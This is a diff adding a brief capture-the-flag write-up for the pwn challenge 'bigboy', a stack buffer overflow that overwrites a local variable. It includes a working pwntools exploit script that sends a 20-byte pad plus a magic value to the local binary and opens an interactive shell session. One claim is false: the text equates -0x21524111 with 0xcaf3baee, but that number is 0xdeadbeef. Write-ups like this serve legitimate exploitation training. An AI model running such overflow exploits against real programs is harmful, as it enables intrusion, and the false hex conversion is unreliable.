@@ -1,0 +1,18 @@
+bigboy was a pwn challenge which involved overwriting a variable with buffer overflow
+
+read variable: local_38
+variable to be overwritten : iStack36
+
+therefore offset = 0x38 - 36 = 20
+
+overwritten value = -0x21524111 = 0xcaf3baee
+
+from pwn import *
+
+elf = ELF("./boi")
+p= elf.process()
+
+p.recv()
+pay = b'a'*20 + p64(0xcaf3baee)
+p.sendline(pay)
+p.interactive()
